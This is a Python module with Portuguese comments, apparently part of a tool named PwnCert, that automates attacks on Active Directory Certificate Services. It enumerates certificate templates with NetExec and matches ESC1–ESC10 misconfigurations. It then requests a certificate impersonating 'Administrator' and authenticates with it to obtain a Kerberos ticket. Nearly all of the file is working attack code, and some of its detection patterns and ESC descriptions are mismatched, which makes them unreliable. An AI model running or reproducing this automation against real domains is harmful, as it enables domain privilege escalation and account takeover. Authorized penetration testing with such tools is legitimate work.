#!/usr/bin/env python3
"""
AutoExploit Module para PwnCert
Fornece automação inteligente de exploração AD CS
"""

import subprocess
import json
import re
from typing import Dict, Optional, Tuple
from datetime import datetime


class VulnerabilityDetector:
    """Detecta e analisa vulnerabilidades ESC em output do NetExec/Certipy"""
    
    # Padrões de vulnerabilidade
    VULNERABILITY_PATTERNS = {
        'ESC1': {
            'pattern': r'ESC1|SubjectAltName.*Enrollee|Enrollment Agent',
            'description': 'Enrollment Agent - Subject Alternative Name (SAN)'
        },
        'ESC2': {
            'pattern': r'ESC2|Any Purpose|Template Allows Issuance',
            'description': 'Certification Authority Officer - Any purpose'
        },
        'ESC3': {
            'pattern': r'ESC3|Request Agent Signature|Authorized Signatures',
            'description': 'Request Agent - Enrollment on Behalf Of'
        },
        'ESC4': {
            'pattern': r'ESC4|Insecure Permissions|Weak Access Control',
            'description': 'Insecure Permissions'
        },
        'ESC5': {
            'pattern': r'ESC5|Insecure Permissions|Owner Write',
            'description': 'Vulnerable PKI Object Permissions'
        },
        'ESC6': {
            'pattern': r'ESC6|EDITF_ATTRIBUTESUBJECTALTNAME2|PKI Interoperability',
            'description': 'EDITF_ATTRIBUTESUBJECTALTNAME2 registry key'
        },
        'ESC7': {
            'pattern': r'ESC7|Insecure Permissions|Vulnerability',
            'description': 'Vulnerable Certificate Authority Access Control'
        },
        'ESC8': {
            'pattern': r'ESC8|NTLM Relay|HTTP Based Enrollment',
            'description': 'NTLM Relay to Web Enrollment Server'
        },
        'ESC9': {
            'pattern': r'ESC9|No Managed Service Account|No Object Security',
            'description': 'No Managed Service Account Required'
        },
        'ESC10': {
            'pattern': r'ESC10|OID Filtering|WeakObjectIdentifier',
            'description': 'Weak Object Identifier Filtering'
        }
    }
    
    @staticmethod
    def detect_vulnerabilities(output: str) -> Dict[str, Dict]:
        """Detecta vulnerabilidades no output
        
        Args:
            output: Output do NetExec/Certipy
            
        Returns:
            Dicionário com vulnerabilidades detectadas
        """
        vulnerabilities = {}
        
        for esc, info in VulnerabilityDetector.VULNERABILITY_PATTERNS.items():
            if re.search(info['pattern'], output, re.IGNORECASE):
                vulnerabilities[esc] = {
                    'detected': True,
                    'description': info['description'],
                    'severity': VulnerabilityDetector.get_severity(esc)
                }
        
        return vulnerabilities
    
    @staticmethod
    def get_severity(esc: str) -> str:
        """Retorna severidade da vulnerabilidade
        
        Args:
            esc: Identificador ESC
            
        Returns:
            Nível de severidade (CRITICAL, HIGH, MEDIUM)
        """
        critical = ['ESC1', 'ESC3', 'ESC6', 'ESC8']
        high = ['ESC2', 'ESC4', 'ESC5', 'ESC7']
        
        if esc in critical:
            return 'CRITICAL'
        elif esc in high:
            return 'HIGH'
        return 'MEDIUM'
    
    @staticmethod
    def extract_ca_info(output: str) -> Optional[Dict]:
        """Extrai informações da CA do output
        
        Args:
            output: Output do NetExec/Certipy
            
        Returns:
            Dicionário com CA e templates ou None
        """
        ca_info = {
            'cas': [],
            'templates': []
        }
        
        # Padrão para CA
        ca_pattern = r'\\[\\*\\]\\s+CA\\s+Name\\s*:\\s*([^\\n]+)|CA:\\s*([^\\n]+)|\\*\\]\\s+CA\\s*-\\s*([^\\n]+)'
        # Padrão para templates
        template_pattern = r'\\[\\+\\]\\s+([\\w\\-]+)\\s*\\(|Template:\\s*([^\\n]+)'
        
        cas = re.findall(ca_pattern, output)
        templates = re.findall(template_pattern, output)
        
        for ca in cas:
            ca_name = next((c for c in ca if c), None)
            if ca_name and ca_name not in ca_info['cas']:
                ca_info['cas'].append(ca_name.strip())
        
        for template in templates:
            template_name = next((t for t in template if t), None)
            if template_name and template_name not in ca_info['templates']:
                ca_info['templates'].append(template_name.strip())
        
        return ca_info if ca_info['cas'] or ca_info['templates'] else None


class AutoExploit:
    """Gerenciador de exploração automática"""
    
    def __init__(self, pwncert, debug: bool = False):
        """Inicializa AutoExploit
        
        Args:
            pwncert: Instância da classe PwnCert
            debug: Modo debug
        """
        self.pwncert = pwncert
        self.debug = debug
        self.log = []
    
    def _log(self, message: str, level: str = 'INFO') -> None:
        """Registra mensagem de log
        
        Args:
            message: Mensagem a registrar
            level: Nível (INFO, SUCCESS, WARNING, ERROR, DEBUG)
        """
        timestamp = datetime.now().strftime('%Y-%m-%d %H:%M:%S')
        log_entry = f"[{timestamp}] [{level}] {message}"
        self.log.append(log_entry)
        
        if level == 'SUCCESS':
            print(f"[+] {message}")
        elif level == 'WARNING':
            print(f"[!] {message}")
        elif level == 'ERROR':
            print(f"[✗] {message}")
        elif level == 'DEBUG' and self.debug:
            print(f"[DEBUG] {message}")
        elif level == 'INFO':
            print(f"[*] {message}")
    
    def run_nxc_enum(self, target: str) -> Tuple[bool, str]:
        """Executa NetExec certipy-find
        
        Args:
            target: IP ou hostname do alvo
            
        Returns:
            Tupla (sucesso, output)
        """
        self._log(f"Iniciando enumeração com NetExec em {target}")
        
        cmd = ['nxc', 'ldap', target]
        
        if self.pwncert.username:
            cmd.extend(['-u', self.pwncert.username])
        
        if self.pwncert.password:
            cmd.extend(['-p', self.pwncert.password])
        elif self.pwncert.hashes:
            cmd.extend(['-H', self.pwncert.hashes])
        
        cmd.extend(['-M', 'certipy-find'])
        
        if self.debug:
            self._log(f"Comando: {' '.join(cmd)}", 'DEBUG')
        
        try:
            result = subprocess.run(
                cmd,
                capture_output=True,
                text=True,
                timeout=60
            )
            
            if result.returncode == 0:
                self._log("Enumeração do NetExec concluída com sucesso", 'SUCCESS')
                return True, result.stdout + result.stderr
            else:
                self._log(f"NetExec retornou código {result.returncode}", 'WARNING')
                return False, result.stderr
                
        except FileNotFoundError:
            self._log("NetExec não encontrado. Instale com: pip install netexec", 'ERROR')
            return False, ""
        except subprocess.TimeoutExpired:
            self._log("Timeout ao executar NetExec", 'ERROR')
            return False, ""
        except Exception as e:
            self._log(f"Erro ao executar NetExec: {str(e)}", 'ERROR')
            return False, ""
    
    def analyze_and_exploit(self, nxc_output: str, target_user: str = 'Administrator') -> bool:
        """Analisa output do NetExec e executa exploração automática
        
        Args:
            nxc_output: Output do NetExec
            target_user: Usuário alvo para exploração
            
        Returns:
            True se exploração bem-sucedida
        """
        self._log("Analisando output do NetExec...")
        
        # Detectar vulnerabilidades
        vulns = VulnerabilityDetector.detect_vulnerabilities(nxc_output)
        ca_info = VulnerabilityDetector.extract_ca_info(nxc_output)
        
        if not vulns:
            self._log("Nenhuma vulnerabilidade detectada", 'WARNING')
            return False
        
        self._log(f"Encontradas {len(vulns)} vulnerabilidade(s):", 'SUCCESS')
        for esc, info in vulns.items():
            self._log(f"  {esc} ({info['severity']}): {info['description']}")
        
        if not ca_info or not ca_info['cas']:
            self._log("Nenhuma CA identificada no output", 'WARNING')
            return False
        
        self._log(f"CAs identificadas: {', '.join(ca_info['cas'])}", 'SUCCESS')
        self._log(f"Templates identificados: {', '.join(ca_info['templates']) if ca_info['templates'] else 'N/A'}", 'SUCCESS')
        
        # Selecionar exploração apropriada
        return self._execute_exploit(vulns, ca_info, target_user)
    
    def _execute_exploit(self, vulns: Dict, ca_info: Dict, target_user: str) -> bool:
        """Executa exploração apropriada baseada em vulnerabilidades
        
        Args:
            vulns: Vulnerabilidades detectadas
            ca_info: Informações de CA
            target_user: Usuário alvo
            
        Returns:
            True se exploração bem-sucedida
        """
        ca = ca_info['cas'][0] if ca_info['cas'] else None
        template = ca_info['templates'][0] if ca_info['templates'] else 'User'
        
        if not ca:
            return False
        
        # ESC1 - Requisitar certificado com SAN
        if 'ESC1' in vulns:
            self._log(f"Executando exploit ESC1 contra CA '{ca}' com template '{template}'...")
            ret = self.pwncert.req(
                ca=ca,
                template=template,
                alt=target_user,
                output=target_user
            )
            
            if ret == 0:
                self._log(f"Certificado obtido: {target_user}.pfx", 'SUCCESS')
                return self._authenticate_and_dump(f"{target_user}.pfx")
        
        # ESC3 - Requisição com permissão de assinatura
        elif 'ESC3' in vulns:
            self._log(f"Executando exploit ESC3 contra CA '{ca}'...")
            ret = self.pwncert.req(
                ca=ca,
                template=template,
                upn=f"{target_user}@{self.pwncert.domain}",
                output=target_user
            )
            
            if ret == 0:
                self._log(f"Certificado obtido: {target_user}.pfx", 'SUCCESS')
                return self._authenticate_and_dump(f"{target_user}.pfx")
        
        # ESC6 - EDITF_ATTRIBUTESUBJECTALTNAME2
        elif 'ESC6' in vulns:
            self._log(f"Executando exploit ESC6 contra CA '{ca}'...")
            ret = self.pwncert.req(
                ca=ca,
                template=template,
                alt=target_user,
                output=target_user
            )
            
            if ret == 0:
                self._log(f"Certificado obtido: {target_user}.pfx", 'SUCCESS')
                return self._authenticate_and_dump(f"{target_user}.pfx")
        
        # ESC8 - NTLM Relay
        elif 'ESC8' in vulns:
            self._log(f"ESC8 detectado - NTLM Relay necessário", 'WARNING')
            self._log(f"Execute manualmente: python pwncert.py relay -ca {ca} -t {template}", 'INFO')
            return False
        
        else:
            # Tentar com primeiro ESC crítico encontrado
            critical_escs = [k for k, v in vulns.items() if v['severity'] == 'CRITICAL']
            if critical_escs:
                esc = critical_escs[0]
                self._log(f"Tentando exploit {esc}...")
                ret = self.pwncert.req(
                    ca=ca,
                    template=template,
                    alt=target_user,
                    output=target_user
                )
                
                if ret == 0:
                    self._log(f"Certificado obtido: {target_user}.pfx", 'SUCCESS')
                    return self._authenticate_and_dump(f"{target_user}.pfx")
        
        return False
    
    def _authenticate_and_dump(self, pfx_file: str) -> bool:
        """Autentica com certificado e extrai credenciais
        
        Args:
            pfx_file: Arquivo PFX
            
        Returns:
            True se bem-sucedido
        """
        self._log(f"Autenticando com certificado {pfx_file}...")
        
        ret = self.pwncert.auth(
            pfx=pfx_file,
            kirbi=True
        )
        
        if ret == 0:
            self._log("Autenticação bem-sucedida!", 'SUCCESS')
            self._log(f"Arquivo kirbi gerado. Use com Rubeus ou Impacket", 'SUCCESS')
            return True
        
        return False
    
    def save_log(self, filename: str = None) -> None:
        """Salva log em arquivo
        
        Args:
            filename: Nome do arquivo (padrão: pwncert_TIMESTAMP.log)
        """
        if not filename:
            timestamp = datetime.now().strftime('%Y%m%d_%H%M%S')
            filename = f"pwncert_{timestamp}.log"
        
        try:
            with open(filename, 'w', encoding='utf-8') as f:
                f.write("\n".join(self.log))
            self._log(f"Log salvo em: {filename}", 'SUCCESS')
        except Exception as e:
            self._log(f"Erro ao salvar log: {str(e)}", 'ERROR')
